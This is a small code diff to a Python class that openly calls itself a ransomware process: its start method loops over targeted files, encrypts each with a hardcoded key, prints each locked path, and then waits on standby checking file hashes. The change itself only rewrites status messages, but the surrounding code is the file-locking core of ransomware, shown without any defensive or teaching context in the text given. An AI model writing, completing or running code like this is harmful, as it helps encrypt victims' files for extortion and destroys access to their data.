@@ -78,14 +78,15 @@ class Runtime:
         return to_lock # return file store
 
     def start(self, mode: str = 'normal'):
-        print("started")
+        print("Ransomware Process Started.")
         # for normal mode:
         if mode == 'normal':
             # for each file to lock, encrypt it
             for file in self.filetolock:
                 self.encrypt(file, "0123456789")
+                print(f"Locked: {file if len(file) <= 60 else file[-60:]}")
             
-            print("locked")
+            print("Locked all targetted files and now on standby.")
             
             # once all files are locked,
             # stay on standby and keep checking hashes
